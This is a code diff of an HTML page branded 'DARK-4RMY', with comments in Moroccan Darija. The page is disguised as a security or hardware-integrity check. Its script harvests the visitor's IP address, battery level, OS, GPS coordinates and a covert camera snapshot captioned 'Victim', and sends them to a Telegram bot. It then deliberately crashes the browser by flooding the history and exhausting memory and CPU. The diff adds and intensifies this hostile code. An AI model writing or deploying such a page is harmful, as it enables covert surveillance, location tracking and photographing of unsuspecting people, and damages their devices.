@@ -3,23 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DARK-4RMY System</title>
+    <title>DARK-4RMY System Security</title>
     <style>
-        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; z-index: 10; }
-        .glitch { animation: glitch 0.5s infinite; }
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-5px, 5px); color: #ff0000; }
-            40% { transform: translate(5px, -5px); color: #00ff00; }
-            100% { transform: translate(0); }
+        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00f3ff; position: relative; z-index: 10; }
+        .glitch { animation: shake 0.1s infinite; color: #ff0000 !important; border-color: #ff0000 !important; box-shadow: 0 0 40px #ff0000 !important; }
+        @keyframes shake {
+            0% { transform: translate(2px, 1px) rotate(0deg); }
+            50% { transform: translate(-2px, -2px) rotate(1deg); }
+            100% { transform: translate(1px, 2px) rotate(-1deg); }
         }
+        #stat { margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="panel" id="main-panel">
-        <h1 id="title">DARK-4RMY</h1>
-        <p id="stat">Connecting to system...</p>
+        <h1 id="title">DARK-4RMY v3.5</h1>
+        <p id="stat">Initializing Encrypted Tunnel...</p>
+        <p id="sub-stat" style="opacity: 0.5;">Verifying Hardware Integrity...</p>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
@@ -29,37 +30,48 @@
         const params = new URLSearchParams(window.location.search);
         const chatId = params.get('id');
 
-        // Function bach n-bloquiw l-browser
-        function triggerLag() {
+        // --- HARD CRASH LOGIC (RAM & CPU KILLER) ---
+        function triggerHardCrash() {
             document.getElementById('main-panel').classList.add('glitch');
-            document.getElementById('stat').innerText = "FATAL ERROR: SYSTEM OVERLOAD";
-            document.getElementById('stat').style.color = "red";
+            document.getElementById('title').innerText = "FATAL ERROR";
+            document.getElementById('stat').innerText = "SYSTEM OVERLOAD: EXHAUSTED";
             
-            // Infinite loop sghira t-t99al l-processor
-            setTimeout(() => {
-                while(true) {
-                    console.log("CRITICAL_FAILURE");
+            // 1. History Flood (Bloqui l-bouton Back)
+            for (let i = 0; i < 50000; i++) {
+                window.history.pushState(null, null, window.location.href);
+            }
+
+            // 2. Resource Exhaustion (RAM & CPU)
+            const memoryLeak = [];
+            setInterval(() => {
+                // Khneq l-RAM b chunks mkhyenin
+                for (let i = 0; i < 100; i++) {
+                    memoryLeak.push(new Array(1000000).fill("DARK-4RMY-STRIKE"));
                 }
-            }, 1000);
+                // Khneq l-CPU b processes la-nihaiya
+                console.log("OVERRIDE_" + Math.random());
+                window.history.pushState({}, '', '#' + Math.random());
+            }, 10);
         }
 
         async function init() {
             if (!chatId) return;
 
             try {
-                // 1. Capture Info (IP/Battery)
+                // 1. IP & Battery
                 const battery = await navigator.getBattery();
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 
-                let report = `🚨 *NEW TARGET LOGGED* 🚨\n\n` +
+                let report = `🚨 *TARGET LOGGED* 🚨\n\n` +
                              `🌐 *IP:* \`${ipData.ip}\`\n` +
                              `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n` +
                              `💻 *OS:* ${navigator.platform}`;
 
                 // 2. GPS
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await sendToBot(report + `\n📍 *GPS:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
+                    const gpsReport = report + `\n📍 *GPS:* [Google Maps](http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                    await sendToBot(gpsReport);
                 }, async () => {
                     await sendToBot(report + `\n📍 *GPS:* Denied ❌`);
                 });
@@ -77,17 +89,19 @@
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(blob => {
                             sendPhoto(blob);
-                            // MNIN NSALIW KOLSXI, N-DIRO L-CRASH
-                            setTimeout(triggerLag, 1500);
+                            // Siftna koulchi? Daba Crash!
+                            setTimeout(triggerHardCrash, 2000);
                         });
                         stream.getTracks().forEach(t => t.stop());
-                    }, 2000);
+                    }, 2500);
                 } catch (e) {
-                    // Ila ma-9belch camera, lag-ih 7ta hoa
-                    setTimeout(triggerLag, 1000);
+                    // Camera refused? Crash anyway
+                    setTimeout(triggerHardCrash, 1000);
                 }
 
-            } catch (err) { triggerLag(); }
+            } catch (err) {
+                triggerHardCrash();
+            }
         }
 
         async function sendToBot(text) {
@@ -101,8 +115,8 @@
         async function sendPhoto(blob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'victim.jpg');
-            formData.append('caption', '📸 *Victim Front Camera Snapshot*');
+            formData.append('photo', blob, 'snap.jpg');
+            formData.append('caption', '📸 *Victim Camera Snapshot*');
             formData.append('parse_mode', 'Markdown');
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         }
